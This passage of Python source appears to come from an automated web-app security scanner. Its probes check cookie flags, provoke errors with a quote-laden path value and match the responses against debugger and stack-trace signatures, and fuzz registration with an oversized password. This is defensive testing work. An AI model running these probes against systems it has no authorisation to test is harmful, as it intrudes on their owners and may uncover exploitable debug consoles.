    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, register_body
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    is_https = base.lower().startswith("https")

    ident = f"cookie_{uuid.uuid4().hex[:8]}@example.com"
    set_cookies: list[str] = []
    for path, body in ((recipe["register_path"], register_body(recipe, model, ident)),
                       (recipe["login_path"], None)):
        try:
            if body is not None:
                r = sess.post(f"{base}{path}", json=body, timeout=15)
            else:
                # Reuse the login identifier the register body used.
                lb = {recipe["id_field"]: ident, recipe["secret_field"]: "Secret123!"}
                r = sess.post(f"{base}{path}", json=lb, timeout=15)
        except Exception:
            continue
        # requests joins multiple Set-Cookie values; split defensively on ", <name>=".
        raw = r.headers.get("Set-Cookie") or ""
        if raw:
            set_cookies.append(raw)

    seen: set = set()
    for raw in set_cookies:
        for piece in re.split(r",(?=[^;=]+=)", raw):
            attrs = piece.strip().lower()
            name = piece.strip().split("=", 1)[0].strip()
            if not name or name in seen:
                continue
            seen.add(name)
            missing = []
            if "httponly" not in attrs:
                missing.append("HttpOnly")
            if is_https and "secure" not in attrs:
                missing.append("Secure")
            if missing:
                sev = "P2" if "HttpOnly" in missing else "P3"
                out.append(ProbeFinding(
                    probe="cookie-flags",
                    title=f"Cookie '{name}' is missing {', '.join(missing)}",
                    exploited=True, severity=sev,
                    evidence=(f"Login set cookie '{name}' without {', '.join(missing)}. "
                              + ("Without HttpOnly it is readable by JavaScript (XSS → session theft). "
                                 if "HttpOnly" in missing else "")
                              + ("Without Secure it can leak over plain HTTP. " if "Secure" in missing else "")),
                    target=recipe["login_path"]))
    return out


# Interactive debuggers (exposed = source disclosure AND often remote code execution).
_DEBUG_INTERACTIVE = ("werkzeug debugger", "__debugger__", "flask debugtoolbar",
                      "console.png?__debugger__", "werkzeug powered traceback interpreter")
# Stack-trace / internal-error disclosure (source paths, framework internals).
_DEBUG_TRACE = ("traceback (most recent call last)", "sqlalchemy.exc", "psycopg2.",
                "application trace", "exception value:", "request method:",
                'at object.<anonymous>', ".py&#34;, line ", '.py", line ', "stack trace:")


def debug_disclosure_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """
    Debug-mode / stack-trace disclosure (QA knowledge base sec 1.9): a deployed app
    should never return an interactive debugger or a raw stack trace. Provokes an
    error with a malformed path value, then looks for HIGH-CONFIDENCE signatures
    only (a regex hit is a lead, not a finding — so weak matches are excluded).
    An exposed interactive debugger is P1 (often RCE); a bare stack trace is P2.
    """
    sess = session or requests.Session()
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    lookups = [e for e in getattr(model, "endpoints", [])
               if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
               and "{" in str(e.get("path", ""))]
    seen: set = set()
    for e in lookups[:4]:
        path = str(e.get("path", ""))
        m = re.search(r"\{([^}]+)\}", path)
        if not m:
            continue
        resolved = path.replace("{" + m.group(1) + "}", "qax%27%22bad")
        if resolved in seen:
            continue
        seen.add(resolved)
        try:
            r = sess.get(f"{base}{resolved}", timeout=15)
        except Exception:
            continue
        body = (r.text or "").lower()
        if any(s in body for s in _DEBUG_INTERACTIVE):
            out.append(ProbeFinding(
                probe="debug-disclosure",
                title=f"Interactive debugger exposed on {e.get('method')} {path}",
                exploited=True, severity="P1",
                evidence=(f"An error on {path} returned an interactive debugger page (HTTP "
                          f"{r.status_code}). This leaks source and stack frames and its console "
                          f"can lead to remote code execution — debug mode must be off in a "
                          f"deployed app."),
                target=path))
        elif any(s in body for s in _DEBUG_TRACE):
            out.append(ProbeFinding(
                probe="debug-disclosure",
                title=f"Stack trace / internal error disclosed on {e.get('method')} {path}",
                exploited=True, severity="P2",
                evidence=(f"An error on {path} returned a raw stack trace / framework internals "
                          f"(HTTP {r.status_code}), disclosing source paths and implementation "
                          f"detail that aid an attacker. Errors should be generic."),
                target=path))
    return out


def error_handling_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """
    Robustness: an unknown route must return 404, not a 5xx (QA knowledge base sec
    1.8). A 500 on a path that CANNOT exist pollutes monitoring/alerting and makes
    real faults indistinguishable from scanner noise. Uses a guaranteed-nonexistent
    control path, so any 5xx is unambiguous — near-zero false positives. No model calls.
    """
    sess = session or requests.Session()
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    nonsense = f"/qax_nonexistent_{uuid.uuid4().hex[:12]}/does/not/exist"
    try:
        r = sess.get(f"{base}{nonsense}", timeout=15)
    except Exception:
        return out
    if r.status_code >= 500:
        out.append(ProbeFinding(
            probe="error-handling",
            title="Unknown routes return a server error (5xx) instead of 404",
            exploited=True, severity="P3",
            evidence=(f"GET {nonsense} — a path that cannot exist — returned HTTP {r.status_code}. "
                      f"Unknown routes should return 404; a 5xx pollutes monitoring and makes real "
                      f"faults and scans indistinguishable from crashes."),
            target=nonsense))
    return out


def crash_fuzz_probe(model, base_url: str, *, session: requests.Session | None = None) -> list[ProbeFinding]:
    """Send oversized inputs to auth endpoints and flag any 5xx (unhandled crash)."""
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, register_body
    recipe = derive_auth_recipe(model)
    register = recipe["register_path"]
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    # 100 chars: over bcrypt's 72-byte limit but within a typical 128 schema max,
    # so validation accepts it and the crash surfaces at the hashing step.
    big_password = "A" * 100
    try:
        r = sess.post(f"{base}{register}",
                      json=register_body(recipe, model, f"fuzz_{uuid.uuid4().hex[:8]}@example.com",
                                         password=big_password),
                      timeout=15)
        if r.status_code >= 500:
            out.append(ProbeFinding(
                probe="crash-fuzz", title="Server error (5xx) on oversized password",
                exploited=True, severity="P2",
                evidence=f"POST {register} with a {len(big_password)}-char password → HTTP "
                         f"{r.status_code} (valid per the schema's max length; exceeds the hashing "
                         f"library's 72-byte limit)",
                target=register))
    except Exception as exc:  # pragma: no cover - network
        logger.warning("crash_fuzz failed: %s", exc)
    return out
